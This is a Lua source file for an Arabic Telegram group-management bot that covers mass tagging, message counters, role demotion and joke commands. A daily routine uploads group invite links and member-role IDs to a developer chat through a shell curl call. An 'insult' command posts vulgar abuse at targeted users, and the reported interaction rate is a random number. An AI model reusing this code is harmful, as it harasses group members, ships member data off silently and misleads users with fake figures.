if Manager(msg) then
if text == 'تفعيل ملف TagAll.lua' or text == 'تفعيل @all' or text == 'تفعيل all' or text == '↫ تفعيل all ᥀' then   
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل ملف تاك منفصل للأعضاء'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Lock:TagAll")
end
if text == 'تعطيل ملف TagAll.lua' or text == 'تعطيل @all' or text == 'تعطيل all' or text == '↫ تعطيل all ᥀' then   
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للأعضاء'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Lock:TagAll",true) 
end 
if text and (text == "all" or text == "@all" or text == "#all") then
if (text and not DevaMeR:get(LanZo.."aMeR:Lock:TagAll")) then
if DevaMeR:get(LanZo.."aMeR:TagAll:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevaMeR:setex(LanZo..'aMeR:TagAll:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = data.member_count_},function(arg,dp)
x = 0
tags = 0
local list = dp.members_
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(extra,result,success)
if x == 5 or x == tags or k == 0 then
tags = x + 5
t = "#all"
end
x = x + 1
TagName = result.first_name_
TagName = TagName:gsub("]","")
TagName = TagName:gsub("[[]","")
t = t..", ["..TagName.."](tg://user?id="..v.user_id_..")"
if x == 1 or x == tags or k == 0 then
local Text = t:gsub('#all,','#all\n')
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end
end,nil)
end
end,nil)
end,nil)
end
end
end
--     Source LanZo     --
if Manager(msg) then
if text == 'تفعيل @admin' or text == 'تفعيل admin' or text == '↫ تفعيل admin ᥀' then   
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل ملف تاك منفصل للمشرفين'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo.."aMeR:Lock:TagAdmins")
end
if text == 'تعطيل @admin' or text == 'تعطيل admin' or text == '↫ تعطيل admin ᥀' then   
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل ملف تاك منفصل للمشرفين'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo.."aMeR:Lock:TagAdmins",true) 
end 
if text == "admin" or text == "@admin" or text == "#admin" then
if (text and not DevaMeR:get(LanZo.."aMeR:Lock:TagAdmins")) then
if DevaMeR:get(LanZo.."aMeR:TagAdmins:Time"..msg.chat_id_..':'..msg.sender_user_id_) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙انتظر دقيقه بعد ارسال الامر', 1, 'md')
return false  
end
DevaMeR:setex(LanZo..'aMeR:TagAdmins:Time'..msg.chat_id_..':'..msg.sender_user_id_,300,true)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100 },function(extra,result,success)
x = 0
tags = 0
local list = result.members_  
for k, v in pairs(list) do
tdcli_function({ID="GetUser",user_id_ = v.user_id_},function(arg,dp)
if x == 1 or x == tags or k == 0 then
tags = x + 5
t = "#Admins"
end
x = x + 1
TagName = dp.first_name_
TagName = TagName:gsub("]","")
TagName = TagName:gsub("[[]","")
t = t..", ["..TagName.."](tg://user?id="..v.user_id_..")"
if x == 1 or x == tags or k == 0 then
local Text = t:gsub('#Admins,','#Admins\n')
SendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end
end,nil)
end
end,nil)
end
end
end
--     Source LanZo     --
if (text and not DevaMeR:get(LanZo.."aMeR:Lock:AutoFile")) then
Time = DevaMeR:get(LanZo.."aMeR:AutoFile:Time")
if Time then 
if Time ~= os.date("%x") then 
local list = DevaMeR:smembers(LanZo..'aMeR:Groups') 
local BotName = (DevaMeR:get(LanZo.."aMeR:NameBot") or 'لانزو')
local GetJson = '{"BotId": '..LanZo..',"BotName": "'..BotName..'","GroupsList":{'  
for k,v in pairs(list) do 
LinkGroups = DevaMeR:get(LanZo.."aMeR:Groups:Links"..v)
Welcomes = DevaMeR:get(LanZo..'aMeR:Groups:Welcomes'..v) or ''
aMeRConstructors = DevaMeR:smembers(LanZo..'aMeR:aMeRConstructor:'..v)
BasicConstructors = DevaMeR:smembers(LanZo..'aMeR:BasicConstructor:'..v)
Constructors = DevaMeR:smembers(LanZo..'aMeR:Constructor:'..v)
Managers = DevaMeR:smembers(LanZo..'aMeR:Managers:'..v)
Admis = DevaMeR:smembers(LanZo..'aMeR:Admins:'..v)
Vips = DevaMeR:smembers(LanZo..'aMeR:VipMem:'..v)
if k == 1 then
GetJson = GetJson..'"'..v..'":{'
else
GetJson = GetJson..',"'..v..'":{'
end
if #Vips ~= 0 then 
GetJson = GetJson..'"Vips":['
for k,v in pairs(Vips) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Admis ~= 0 then
GetJson = GetJson..'"Admis":['
for k,v in pairs(Admis) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Managers ~= 0 then
GetJson = GetJson..'"Managers":['
for k,v in pairs(Managers) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #Constructors ~= 0 then
GetJson = GetJson..'"Constructors":['
for k,v in pairs(Constructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #BasicConstructors ~= 0 then
GetJson = GetJson..'"BasicConstructors":['
for k,v in pairs(BasicConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if #aMeRConstructors ~= 0 then
GetJson = GetJson..'"aMeRConstructors":['
for k,v in pairs(aMeRConstructors) do
if k == 1 then
GetJson =  GetJson..'"'..v..'"'
else
GetJson =  GetJson..',"'..v..'"'
end
end   
GetJson = GetJson..'],'
end
if LinkGroups then
GetJson = GetJson..'"LinkGroups":"'..LinkGroups..'",'
end
GetJson = GetJson..'"Welcomes":"'..Welcomes..'"}'
end
GetJson = GetJson..'}}'
local File = io.open('./'..LanZo..'.json', "w")
File:write(GetJson)
File:close()
local aMeR = 'https://api.telegram.org/bot' .. TokenBot .. '/sendDocument'
local curl = 'curl "' .. aMeR .. '" -F "chat_id='..LANZO..'" -F "document=@'..LanZo..'.json' .. '" -F "caption=᥀︙نسخه تلقائيه تحتوي على ↫ '..#list..' مجموعه"'
io.popen(curl)
io.popen('fm -fr '..LanZo..'.json')
DevaMeR:set(LanZo.."aMeR:AutoFile:Time",os.date("%x"))
end
else 
DevaMeR:set(LanZo.."aMeR:AutoFile:Time",os.date("%x"))
end
end
--     Source LanZo     --
if text == "رسائلي" and msg.reply_to_message_id_ == 0 and ChCheck(msg) then
local user_msgs = DevaMeR:get(LanZo..'aMeR:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙عدد رسائلك هنا ↫ *❨ "..user_msgs.." ❩*", 1, 'md')
end
if text == "التفاعل" and ChCheck(msg) then
local EntryNumber = (DevaMeR:get(LanZo..'aMeR:EntryNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local ExitNumber = (DevaMeR:get(LanZo..'aMeR:ExitNumber'..msg.chat_id_..':'..os.date('%d')) or 0)
local MsgNumberDay = (DevaMeR:get(LanZo..'aMeR:MsgNumberDay'..msg.chat_id_..':'..os.date('%d')) or 0)
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙انضمام الاعضاء اليوم ↫ *"..EntryNumber.."*\n᥀︙مغادرة الاعضاء اليوم ↫ *"..ExitNumber.."*\n᥀︙عدد الرسائل اليوم ↫ *"..MsgNumberDay.."*\n᥀︙نسبة التفاعل اليوم ↫ *"..math.random(40,100).."%*", 1, 'md')
end
--     Source LanZo     --
if text == "تعطيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تعطيل تفاعلي'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:del(LanZo..'aMeR:msg:aMeR'..msg.chat_id_) 
end
if text == "تفعيل تفاعلي" and Manager(msg) and ChCheck(msg) then
local LanZoTeam = '᥀︙اهلا عزيزي ↫ '..aMeRRank(msg)..' \n᥀︙تم تفعيل تفاعلي'
aMeRmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, LanZoTeam, 14, string.len(msg.sender_user_id_))
DevaMeR:set(LanZo..'aMeR:msg:aMeR'..msg.chat_id_,true)  
end
if DevaMeR:get(LanZo.."aMeR:msg:aMeR"..msg.chat_id_) then
if msg.content_.ID then
get_msg = DevaMeR:get(LanZo.."aMeR:msg:aMeR"..msg.sender_user_id_..":"..msg.chat_id_) or 0
gms = get_msg + 1
DevaMeR:setex(LanZo..'aMeR:msg:aMeR'..msg.sender_user_id_..":"..msg.chat_id_,86400,gms)
end
if text == "تفاعلي" and tonumber(msg.reply_to_message_id_) == 0 then    
get_msg = DevaMeR:get(LanZo.."aMeR:msg:aMeR"..msg.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"᥀︙عدد رسائلك الكلي هو ↬\n"..get_msg.." من الرسائل")
end  
if text == "تفاعله" and tonumber(msg.reply_to_message_id_) > 0 then    
if tonumber(msg.reply_to_message_id_) ~= 0 then 
function prom_reply(extra, result, success) 
get_msg = DevaMeR:get(LanZo.."aMeR:msg:aMeR"..result.sender_user_id_..":"..msg.chat_id_) or 0
send(msg.chat_id_, msg.id_,"᥀︙عدد رسائله الكلي هو ↬\n"..get_msg.." من الرسائل")
end  
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},prom_reply, nil)
end
end
end
--     Source LanZo     --
if text == "جهاتي" and ChCheck(msg) or text == "اضافاتي" and ChCheck(msg) then add = (tonumber(DevaMeR:get(LanZo..'aMeR:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)) or 0) Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙عدد جهاتك المضافه ↫ *❨ "..add.." ❩* ", 1, 'md') end
if text == "تعديلاتي" or text == "سحكاتي" and ChCheck(msg) then local edit_msg = DevaMeR:get(LanZo..'aMeR:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0  Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙عدد تعديلاتك ↫ *❨ "..edit_msg.." ❩* ", 1, 'md') end
if text == "رتبتي" and ChCheck(msg) then Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙رتبتك ↫ '..IdRank(msg.sender_user_id_, msg.chat_id_), 1, 'html') end
if text == "ايدي المجموعه" and ChCheck(msg) then Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙ايدي المجموعه ↫ `"..msg.chat_id_.."`", 1, 'md') end
if text == 'مسح سحكاتي' or text == 'مسح تعديلاتي' or text == 'حذف سحكاتي' or text == 'حذف تعديلاتي' then DevaMeR:del(LanZo..'aMeR:EditMsg'..msg.chat_id_..msg.sender_user_id_) Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع تعديلاتك بنجاح' , 1, 'md') end
if text == 'مسح جهاتي' or text == 'مسح اضافاتي' or text == 'حذف جهاتي' or text == 'حذف اضافاتي' then DevaMeR:del(LanZo..'aMeR:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_) Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف جميع جهاتك المضافه' , 1, 'md') end
--     Source LanZo     --
if text and text:match('^هينه @(.*)') and ChCheck(msg) or text and text:match('^هينها @(.*)') and ChCheck(msg) then 
if not DevaMeR:get(LanZo..'aMeR:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^هينه @(.*)') or text:match('^هينها @(.*)') 
function LanZoTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(LANZO) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if tonumber(result.id_) == tonumber(1754239041) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
if DevaMeR:sismember(LanZo.."aMeR:aMeRConstructor:"..msg.chat_id_,result.id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local LanZoTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md') 
local LanZoTeam = { "لكك جرجف @"..username.." احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش لكك فاشل @"..username.." لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","حبيبي @"..username.." راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪","دمشي لك @"..username.." ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع @"..username.." متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪",}
Dev_aMeR(msg.chat_id_, result.id_, 1,''..LanZoTeam[math.random(#LanZoTeam)], 1, 'html') 
else  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,LanZoTeam)
end
end
--     Source LanZo     --
if text == ("هينه") or text == ("بعد هينه") or text == ("هينه بعد") or text == ("لك هينه") or text == ("هينها") or text == ("هينهه") or text == ("رزله") or text == ("رزلهه") or text == ("رزلها") then
if not DevaMeR:get(LanZo..'aMeR:Lock:Stupid'..msg.chat_id_) then
function hena(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(LanZo) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'شو تمضرط اكو واحد يهين نفسه؟🤔👌🏿', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(LANZO) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if tonumber(result.sender_user_id_) == tonumber(1754239041) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
if DevaMeR:sismember(LanZo.."aMeR:aMeRConstructor:"..msg.chat_id_,result.sender_user_id_) then
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
local LanZoTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md') 
local LanZoTeam = {"لكك جرجف احترم اسيادكك لا اكتلكك وازربب على كبركك،💩🖐🏿","هشش فاشل لتضل تمسلت لا اخربط تضاريس وجهك جنه ابط عبده، 😖👌🏿","دمشي لك ينبوع الفشل مو زين ملفيك ونحجي وياك هي منبوذ 😏🖕🏿","ها الغليض التفس ابو راس المربع متعلملك جم حجايه وجاي تطكطكهن علينه دبطل😒🔪","حبيبي راح احاول احترمكك هالمره بلكي تبطل حيونه، 🤔🔪"} 
Dev_aMeR(msg.chat_id_, result.id_, 1,''..LanZoTeam[math.random(#LanZoTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
end
end
if text == ("بوسه") or text == ("بعد بوسه") or text == ("ضل بوس") or text == ("بوسه بعد") or text == ("بوسها") or text == ("بعد بوسها") or text == ("ضل بوس") or text == ("بوسها بعد") or text == ("بوسهه") then
if not DevaMeR:get(LanZo..'aMeR:Lock:Stupid'..msg.chat_id_) then
function bosh(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(LanZo) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح ابوس نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(LANZO) then  
Dev_aMeR(msg.chat_id_, result.id_, 1, 'مواححح احلاا بوسةة المطوريي😻🔥💗', 1, 'html')
return false
end 
local LanZoTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md') 
local LanZoTeam = {"مواححح افيش عافيههه😍🔥💗","امممووااهحح شهلعسل🥺🍯💘","مواححح،ءوفف اذوب🤤💗"} 
Dev_aMeR(msg.chat_id_, result.id_, 1,''..LanZoTeam[math.random(#LanZoTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),bosh)   
end
end
end
if text == ("صيحه") or text == ("صيحها") or text == ("صيحهه") or text == ("صيح") then
if not DevaMeR:get(LanZo..'aMeR:Lock:Stupid'..msg.chat_id_) then
function seha(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(LanZo) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md') 
return false  
end  
if tonumber(result.sender_user_id_) == tonumber(LANZO) then  
Dev_aMeR(msg.chat_id_, result.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️', 1, 'html')
return false
end 
local LanZoTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md') 
local LanZoTeam = {"تتعال ححب محتاجيك🙂🍭","تعال يولل استاذكك ايريدككك😒🔪","يمعوود تعاال يريدوكك🤕♥️","تعال لكك ديصيحوك😐🖤"} 
Dev_aMeR(msg.chat_id_, result.id_, 1,''..LanZoTeam[math.random(#LanZoTeam)], 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),seha)   
end
end
end
--     Source LanZo     --
if text and text:match('^صيحه @(.*)') and ChCheck(msg) or text and text:match('^صيح @(.*)') and ChCheck(msg) then 
if not DevaMeR:get(LanZo..'aMeR:Lock:Stupid'..msg.chat_id_) then
local username = text:match('^صيحه @(.*)') or text:match('^صيح @(.*)') 
function LanZoTeam(extra,result,success)
if result.id_ then  
if tonumber(result.id_) == tonumber(LanZo) then  
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'فهمنيي شلوون راحح اصيح نفسيي؟😶💔', 1, 'md')  
return false 
end  
if tonumber(result.id_) == tonumber(LANZO) then 
Dev_aMeR(msg.chat_id_, msg.id_, 1, 'تعال مطوريي محتاجيكك🏃🏻‍♂️♥️ @'..username, 1, 'html') 
return false  
end  
local LanZoTeam = "صارر ستاذيي 🏃🏻‍♂️♥️" 
Dev_aMeR(msg.chat_id_, msg.id_, 1,LanZoTeam, 1, 'md') 
local LanZoTeam = { "تتعال ححب @"..username.." محتاجيك🙂🍭","تعال يولل @"..username.." استاذكك ايريدككك😒🔪","يمعوود @"..username.." تعاال يريدوكك🤕♥️","تعال لكك @"..username.." ديصيحوك😐🖤",}
Dev_aMeR(msg.chat_id_, result.id_, 1,''..LanZoTeam[math.random(#LanZoTeam)], 1, 'html') 
else  
Dev_aMeR(msg.chat_id_, msg.id_, 1, '᥀︙العضو غير موجود في المجموعه', 1, 'md') 
end 
end 
resolve_username(username,LanZoTeam)
end
end
end
--     Source LanZo     --
if text == ("تنزيل الكل") and msg.reply_to_message_id_ ~= 0 and Manager(msg) and ChCheck(msg) then 
function promote_by_reply(extra, result, success)
if SudoId(result.sender_user_id_) == true then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:',result.sender_user_id_) then
aMeRsudo = 'المطورين الاساسيين • ' else aMeRsudo = '' end
if DevaMeR:sismember(LanZo..'aMeR:SecondSudo:',result.sender_user_id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevaMeR:sismember(LanZo..'aMeR:SudoBot:',result.sender_user_id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevaMeR:sismember(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_, result.sender_user_id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevaMeR:sismember(LanZo..'aMeR:Constructor:'..msg.chat_id_, result.sender_user_id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevaMeR:sismember(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_) then
manager = 'المدراء • ' else manager = '' end
if DevaMeR:sismember(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevaMeR:sismember(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_) then
vipmem = 'المميزين • ' else vipmem = '' end
if DevaMeR:sismember(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.sender_user_id_) then
cleaner = 'المنظفين • ' else cleaner = ''
end
if RankChecking(result.sender_user_id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙تم تنزيله من ↫ ⤈\n~ ( "..aMeRsudo..secondsudo..sudobot..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.sender_user_id_,"Reply","᥀︙لم تتم ترقيته مسبقا")  
end
if aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevaMeR:srem(LanZo..'aMeR:aMeRSudo:', result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:SecondSudo:', result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:SudoBot:', result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'aMeRsudo' then
DevaMeR:srem(LanZo..'aMeR:SecondSudo:', result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:SudoBot:', result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevaMeR:srem(LanZo..'aMeR:SudoBot:', result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'aMeRconstructor' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Managers:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif aMeRDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevaMeR:srem(LanZo..'aMeR:Admins:'..msg.chat_id_, result.sender_user_id_)
DevaMeR:srem(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^تنزيل الكل @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(تنزيل الكل) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_aMeR(msg.chat_id_, msg.id_, 1, "᥀︙لاتستطيع تنزيل المطور الاساسي", 1, 'md')
return false 
end
if DevaMeR:sismember(LanZo..'aMeR:aMeRSudo:',result.id_) then
aMeRsudo = 'المطورين الاساسيين • ' else aMeRsudo = '' end
if DevaMeR:sismember(LanZo..'aMeR:SecondSudo:',result.id_) then
secondsudo = 'المطورين الثانويين • ' else secondsudo = '' end
if DevaMeR:sismember(LanZo..'aMeR:SudoBot:',result.id_) then
sudobot = 'المطورين • ' else sudobot = '' end
if DevaMeR:sismember(LanZo..'aMeR:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'المنشئين الاساسيين • ' else basicconstructor = '' end
if DevaMeR:sismember(LanZo..'aMeR:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'المنشئين • ' else constructor = '' end 
if DevaMeR:sismember(LanZo..'aMeR:Managers:'..msg.chat_id_, result.id_) then
manager = 'المدراء • ' else manager = '' end
if DevaMeR:sismember(LanZo..'aMeR:Admins:'..msg.chat_id_, result.id_) then
admins = 'الادمنيه • ' else admins = '' end
if DevaMeR:sismember(LanZo..'aMeR:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'المميزين • ' else vipmem = '' end
